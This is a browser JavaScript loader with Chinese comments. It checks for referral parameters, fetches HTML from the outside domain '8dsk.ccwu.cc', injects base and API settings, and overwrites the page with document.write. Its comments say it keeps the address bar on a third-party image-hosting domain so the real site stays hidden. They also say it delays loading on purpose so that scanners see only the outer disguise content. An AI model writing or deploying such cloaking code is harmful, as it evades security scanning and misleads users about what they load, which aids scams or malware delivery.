(function () {
  'use strict';
  try {
    var domains = [
    '8dsk.ccwu.cc'
    ];

    // 透传整个 query string（兼容新格式 ?ep=xxx&d=xxx&er=xxx 和老格式 ?code=xxx）
    var rawSearch = window.location.search || '';
    var urlParams = new URLSearchParams(rawSearch);
    // 任一推广参数缺失即认为参数错误
    var hasParam = urlParams.get('ep') || urlParams.get('code') || urlParams.get('ref');
    if (!hasParam) {
      document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">参数错误</div>';
      return;
    }

    // 直接拼整个 query string，把 ep/d/er 一并带到落地页
    var queryStr = rawSearch.replace(/^\?/, '');
    var landingPath = '/h5/v2/index.htm' + (('/h5/v2/index.htm'.indexOf('?') > -1) ? '&' : '?') + queryStr;

    // 已使用过的域名索引，避免重复
    var usedIndexes = {};
    var maxRetries = Math.min(5, domains.length);

    function getRandomUnusedDomain() {
      var remaining = [];
      for (var i = 0; i < domains.length; i++) {
        if (!usedIndexes[i]) remaining.push(i);
      }
      if (remaining.length === 0) return null;
      var idx = remaining[Math.floor(Math.random() * remaining.length)];
      usedIndexes[idx] = true;
      return domains[idx];
    }

    function buildUrl(domain) {
      var protocol = window.location.protocol === 'https:' ? 'https:' : 'http:';
      return protocol + '//' + domain + landingPath;
    }

    // 主逻辑：fetch HTML → document.write 替换页面
    function init() {
      var attempt = 0;

      function tryNext() {
        if (attempt >= maxRetries) {
          document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">加载失败，请刷新重试</div>';
          return;
        }
        var domain = getRandomUnusedDomain();
        if (!domain) {
          document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">加载失败，请刷新重试</div>';
          return;
        }
        var url = buildUrl(domain);
        attempt++;

        fetch(url, { mode: 'cors', credentials: 'omit' })
          .then(function (res) {
            if (!res.ok) throw new Error(res.status);
            return res.text();
          })
          .then(function (html) {
            // 注入 <base href> + 嵌入模式标志：
            // 1. <base href>：让 vue-app 所有静态/动态资源（含 vite 运行时 import 的 chunk）
            //    走 vue-app 域名加载，不依赖父页面 origin。
            // 2. window.__EMBEDDED__ = true：vue-app 检测到这个标志会用 memoryHistory，
            //    地址栏永远锁死在第三方域名（cfile 图床），不暴露 #/path。
            //    用户直接访问 8dsk.ccwu.cc 没这个标志时仍用 hashHistory，刷新/分享内页正常。
            // 3. window.__API_BASE__：让 vue-app 的 axios 请求走 vue-app 域名的 /api。
            var baseHref = (window.location.protocol === 'https:' ? 'https:' : 'http:') + '//' + domain + '/';
            var baseTag = '<base href="' + baseHref + '">';
            var apiInject = '<script>window.__EMBEDDED__=true;window.__API_BASE__="' + baseHref + 'api";<' + '/script>';
            var inject = baseTag + apiInject;
            var lower = html.toLowerCase();
            var headIdx = lower.indexOf('<head>');
            if (headIdx === -1) headIdx = lower.indexOf('<head ');
            if (headIdx !== -1) {
              var headEnd = html.indexOf('>', headIdx) + 1;
              html = html.substring(0, headEnd) + inject + html.substring(headEnd);
            } else {
              var htmlIdx = lower.indexOf('<html');
              if (htmlIdx !== -1) {
                var htmlEnd = html.indexOf('>', htmlIdx) + 1;
                html = html.substring(0, htmlEnd) + '<head>' + inject + '<' + '/head>' + html.substring(htmlEnd);
              } else {
                html = inject + html;
              }
            }
            document.open();
            document.write(html);
            document.close();
          })
          .catch(function () {
            tryNext();
          });
      }

      tryNext();
    }

    // 延迟执行，让扫描器先抓到外层伪装内容
    setTimeout(init, 300);
  } catch (e) {
    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">系统错误</div>';
  }
})();
